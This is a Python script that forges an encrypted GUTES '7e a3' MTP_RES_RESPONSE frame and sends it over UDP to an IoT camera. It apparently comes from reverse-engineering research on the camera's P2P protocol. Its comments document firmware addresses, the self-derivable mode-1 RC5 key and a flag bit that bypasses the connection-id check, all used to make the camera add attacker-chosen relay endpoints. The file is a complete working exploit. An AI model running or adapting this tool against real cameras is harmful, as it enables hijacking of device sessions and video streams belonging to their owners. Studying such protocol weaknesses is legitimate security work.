#!/usr/bin/env python3
"""
Build a forged GUTES `7e a3` MTP_RES_RESPONSE and send it straight at a camera.

WHY THIS FRAME
--------------
P2P_PROTOCOL.md 5h: the camera's `kcb->output` gate (static @ 0x5c1d8) accepts
ONLY channels of type 135.  Type 135 is produced by exactly one function,
`iv_mtp_session_add_udp_relay`, which has exactly one caller,
`gat_on_rcvpkt_MTP_RES_RESPONSE` @ 0x4bafc -- reached from `giot_on_rcvpkt`
(type 163) on the *ordinary LAN receive path* (non-0xc0 frames fall through to
it at the router on 0x340c4).

So the relay is bypassable: hand the camera a `7e a3` ourselves and it runs the
same code the AWS relay would have triggered.

WHY MODE 1 (and not the mode the real frames use)
-------------------------------------------------
iv_gute_frm_rc5_decrypt @ 0x2ad98 reads the key mode from the frame itself:

    mode = (buf[0x14] >> 16) & 3
    mode == 0 -> no crypto, just `verity_chkval(buf) == buf[0x10]`  (bit21 skips)
    mode != 0 -> iv_gute_frm_decrypt_id(buf, ctx->0xd0, ...)   <-- may touch buf
                 mode == 1 -> key built locally: buf[0..3]||buf[0x14..0x16]||0x00
                 mode == 2 -> session key held at ctx->0xd8

Every `7e a3` captured from the real relay is mode 2, so it CANNOT be decrypted
without the session key -- and mode 1 runs `decrypt_id` first, which we do not
control.  Mode 1 is chosen because:

  * the key is derived entirely from bytes we write (proven byte-exact: the
    list server accepts our mode-1 LIST_REQUEST), and
  * the camera demonstrably processes our mode-1 frames -- the replayed CALLING
    in wire/p2p_frames.json is mode 1 ((flags>>16)&3 == 1, flags = 0xd2054bfa)
    and the camera acks it.

Sanity check on the decoder: the mode-1 CALLING decrypts to the documented
plaintext -- +24 = 3, +48 = 0x00010000, +64..68 = c0a800f2 (192.168.77.19, the
phone), +72..119 all zero, and +28 == the word read in the clear from the
hello.  The cap_relay mode-2 frames fail those same tests, which is what exposed
the two key modes.

FIELD MAP  (all offsets from `gat_on_rcvpkt_MTP_RES_RESPONSE`'s own loads;
frame pointer = arg1+400, written once at 0x4bb28)
------------------------------------------------------------
  +0        0x7e            +1      0xa3        +2:4   u16LE total len
  +4:12     8 B id          +12:16  seq         +16:20 checksum
  +20:24    flags, mode 1 = 0x00010000
  +24:28    u32             +28:32  CONV  -> iv_find_mtp_session(ctx->8, ...)
  +54:56    u16 port (network order) +64:68 u32 ip  -> sockaddr for type-2 LAN
  +88:90    u16 port  +96:100 u32 ip  -> session+0x4c  -> add_lan_or_nat(1)
  +92:94    u16 port  +104:120 16 B v6 -> session+0x7c -> add_lan_or_nat(1)
  +94:96    u16 port (== session_socket_udpport) -> session+0x508 / +0x528
  +100:104  u32 ip (the "outer"/public one)
  +120      nA, u8, clamped to 32 (signed read)
  +121      nB, u8, clamped to 16
  +122...   nA * 16 B entries, memcpy'd to r11-696, walked by:

              entry+12 -> u32 ip     (skipped when ip == 0)
              entry+10 -> u16 port
              entry+8  -> &sockaddr_in passed to iv_mtp_session_add_udp_relay

            i.e. a sockaddr_in laid out at entry+8:
              +8 u16 family | +10 u16 port | +12 u32 ip   (8 bytes exactly)

Both the ==1 and !=1 gate at 0x4bb68 converge on 0x4c498 (list parse), so the
`session+0x4dc == 1` gate cannot keep us from reaching add_udp_relay.

AMBIGUITY handled by sending two entries
----------------------------------------
entry+10 could be the port in host or network order -- the sibling type-2 path
byte-swaps frame[54:56] before storing it, the list-A path does not swap.  So
entry 0 stores htons(port), entry 1 stores the host-order u16; whichever the
camera compares/sends with, one entry is right.  They are deduped by
`iv_find_udpNode_by_addr`, so the other is merely inert.

Usage:
    python3 mtp_res.py --selftest
    python3 mtp_res.py --conv 0xef34cbd9 --ip 192.168.77.20 --port 48171
"""
import os
import socket
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from listreq import (checksum, payload_len, rc5_decrypt_block,   # noqa: E402
                     rc5_encrypt_block, rc5_setup)

# flags = 0x02050000.  Measured, not guessed -- see flags_probe.py:
#
#   mode = (flags >> 16) & 3 == 1   header-derived RC5 key (bit 17 clear)
#   ack  = (flags >> 18) & 3 == 1   selects switch case 1 @ 0x2c564, which
#                                   sends `7e a3 20 00` before dispatching
#   bit20 = 0                       not iv_gutes_on_rcvfrm_ack
#   bit21 = 0                       checksum IS verified; 1 would skip it
#                                   (bne @ 0x2adfc)
#   bit25 = 1  *** THE FIX ***      bypasses the 0x7e connection-id check
#
# WHY BIT25 MATTERS (proven 2026-10-13, on .169 and .217):
# iv_gutes_on_rcvpkt @ 0x2c320 tests (flags>>25)&1; when it is 0 and the magic
# is 0x7e it compares frame[4:12] against *(*ctx+0xde8:0xdec) and then
# *(*ctx+0xc0) against 2, and on ANY mismatch does `return 0` @ 0x2c3b4 -- a
# drop with no ack, no log, nothing.  Our id8 was copied blindly from the
# CALLING and never matched, so every forged 7e a3 died there.  That is the
# only silent exit available to an ack==1 frame: both other outcomes ack
# (failure @ 0x2c278, success case 1 @ 0x2c594), which is why silence was a
# usable witness.
#
# All four real frames carry bit25=1 (CALLING d2054bfa/b2056d8a/a205281e,
# AvStreamCtl d205f962), as do the mode-2 relay frames.  The high byte is in
# NEITHER the RC5 key (buf[0..3]||buf[0x14..0x16]||0x00) NOR the checksum seed
# (masked 0x00FFFFFF), so the protocol deliberately does not verify it.
FLAGS1 = 0x02050000
MAGIC, TYPE = 0x7E, 0xA3


def entry(ip, port, net_order=True):
    """One 16-byte list-A record: 8 B spare then a sockaddr_in at +8."""
    e = bytearray(16)
    struct.pack_into("<H", e, 8, socket.AF_INET)
    struct.pack_into(">H" if net_order else "<H", e, 10, port)
    e[12:16] = socket.inet_aton(ip)
    return bytes(e)


def build(conv, ip, port, id8=b"\x00" * 8, seq=0, entries=None,
          flags=FLAGS1, corrupt_chk=False):
    """Return a ready-to-send mode-1 `7e a3` (plaintext fields -> chk -> RC5).

    flags / corrupt_chk exist only for flags_probe.py:

      flags      the whole [20:24] word.  Only bits 0..23 reach the RC5 key
                 (buf[0x14..0x16]) and the checksum seed (masked 0x00FFFFFF),
                 and build() derives both AFTER flags is written, so every bit
                 stays consistent automatically.
      corrupt_chk  XOR the checksum word after it is computed, so the camera's
                 verity_chkval fails.  iv_gutes_frm_decrypt then returns < 0,
                 which makes iv_gutes_on_rcvpkt @ 0x2c278 send an ack -- a
                 positive "this frame reached the function" signal.
    """
    if entries is None:
        entries = [entry(ip, port, True), entry(ip, port, False)]
    n_a = len(entries)
    total = 122 + n_a * 16

    buf = bytearray(total)
    buf[0], buf[1] = MAGIC, TYPE
    struct.pack_into("<H", buf, 2, total)
    buf[4:12] = id8[:8].ljust(8, b"\x00")
    struct.pack_into("<I", buf, 12, seq)
    struct.pack_into("<I", buf, 20, flags)
    struct.pack_into("<I", buf, 24, 3)                 # CALLING convention
    struct.pack_into("<I", buf, 28, conv & 0xFFFFFFFF)  # -> iv_find_mtp_session

    # type-2 LAN sockaddr (frame[54] is stored network order and swapped)
    struct.pack_into(">H", buf, 54, port)
    buf[64:68] = socket.inet_aton(ip)

    # the four u16 port slots + the two IPv4 slots
    for off in (88, 92, 94):
        struct.pack_into("<H", buf, off, port)
    buf[96:100] = socket.inet_aton(ip)     # peerlanip -> session+0x50
    buf[100:104] = socket.inet_aton(ip)    # "outer"    -> session+0x64
    # buf[104:120] stays zero: IPv6 -> session+0x7c

    buf[120] = n_a                          # v4_cnt
    buf[121] = 0                            # v6_cnt
    for i, e in enumerate(entries):
        buf[122 + i * 16:122 + (i + 1) * 16] = e

    struct.pack_into("<I", buf, 16, checksum(buf))
    if corrupt_chk:
        buf[16:20] = bytes(b ^ 0xDE for b in buf[16:20])

    key = bytes([buf[0], buf[1], buf[2], buf[3],
                 buf[0x14], buf[0x15], buf[0x16], 0x00])
    st = rc5_setup(key)
    buf[12:20] = rc5_encrypt_block(st, bytes(buf[12:20]), "little")
    for i in range(payload_len(buf) >> 3):
        off = 24 + i * 8
        buf[off:off + 8] = rc5_encrypt_block(st, bytes(buf[off:off + 8]),
                                             "little")
    return bytes(buf)


def decrypt_plain(frame):
    """What the camera's mode-1 path produces: verify the round trip."""
    key = frame[0:4] + frame[20:23] + b"\x00"
    st = rc5_setup(key)
    out = bytearray(frame)
    for off in list(range(12, 20, 8)) + list(range(24, len(frame), 8)):
        if off + 8 > len(out):
            break
        out[off:off + 8] = rc5_decrypt_block(st, bytes(frame[off:off + 8]),
                                             "little")
    return bytes(out)


def selftest():
    conv, ip, port = 0xEF34CBD9, "192.168.77.20", 48171
    plain_ref = build(conv, ip, port)
    # rebuild the plaintext half to compare against the decrypt of the sent one
    got = decrypt_plain(plain_ref)
    ok = True

    def chk(label, cond, extra=""):
        nonlocal ok
        ok = ok and cond
        print("  %-42s %s %s" % (label, "OK " if cond else "FAIL", extra))

    print("[selftest] mode-1 7e a3 round trip")
    chk("magic/type", got[0] == MAGIC and got[1] == TYPE)
    chk("length field", struct.unpack_from("<H", got, 2)[0] == len(got),
        "%d" % len(got))
    chk("mode bits == 1",
        (struct.unpack_from("<I", got, 20)[0] >> 16) & 3 == 1)
    chk("ack field == 1 (matches app frames)",
        (struct.unpack_from("<I", got, 20)[0] >> 18) & 3 == 1)
    chk("conv @+28", struct.unpack_from("<I", got, 28)[0] == conv,
        "0x%08x" % conv)
    chk("checksum verifies",
        checksum(got) == struct.unpack_from("<I", got, 16)[0])
    chk("nA @+120", got[120] == 2, "nA=%d nB=%d" % (got[120], got[121]))
    chk("ip @+64 matches", got[64:68] == socket.inet_aton(ip))
    chk("ip @+96 matches", got[96:100] == socket.inet_aton(ip))
    chk("port @+88 host order",
        struct.unpack_from("<H", got, 88)[0] == port)
    chk("port @+54 network order",
        struct.unpack_from(">H", got, 54)[0] == port)
    for i, want_net in enumerate((True, False)):
        e = got[122 + i * 16:122 + (i + 1) * 16]
        chk("entry%d family@+8" % i, struct.unpack_from("<H", e, 8)[0] == 2)
        chk("entry%d ip@+12" % i, e[12:16] == socket.inet_aton(ip))
        chk("entry%d port@+10" % i,
            struct.unpack_from(">H" if want_net else "<H", e, 10)[0] == port,
            "net" if want_net else "host")
    # RC5 covers [12:20] and whole blocks from 24; the last 2 bytes of a
    # 154 B frame fall outside and must stay plaintext on both sides.
    end = 24 + (payload_len(got) >> 3) * 8
    chk("encrypt region ends at payload_len", end == 152, "end=%d" % end)
    chk("tail is outside the cipher", len(got) - end == 2,
        "%d B" % (len(got) - end))
    print("  ->", "ALL OK" if ok else "FAILURES ABOVE")
    return 0 if ok else 1


def main():
    a = sys.argv[1:]
    if "--selftest" in a or not a:
        return selftest()

    def val(name, default=None):
        if name in a:
            return a[a.index(name) + 1]
        return default

    conv = int(val("--conv", "0"), 0)
    ip = val("--ip", "192.168.77.20")
    port = int(val("--port", "48171"))
    target = val("--to")
    frame = build(conv, ip, port)
    print("built %d B mode-1 7e a3  conv=0x%08x  -> %s:%d"
          % (len(frame), conv, target or "(dry run)", port))
    print(frame.hex())
    if not target:
        return 0
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(frame, (target, int(val("--dport", "62652"))))
    s.close()
    print("sent")
    return 0


if __name__ == "__main__":
    sys.exit(main())
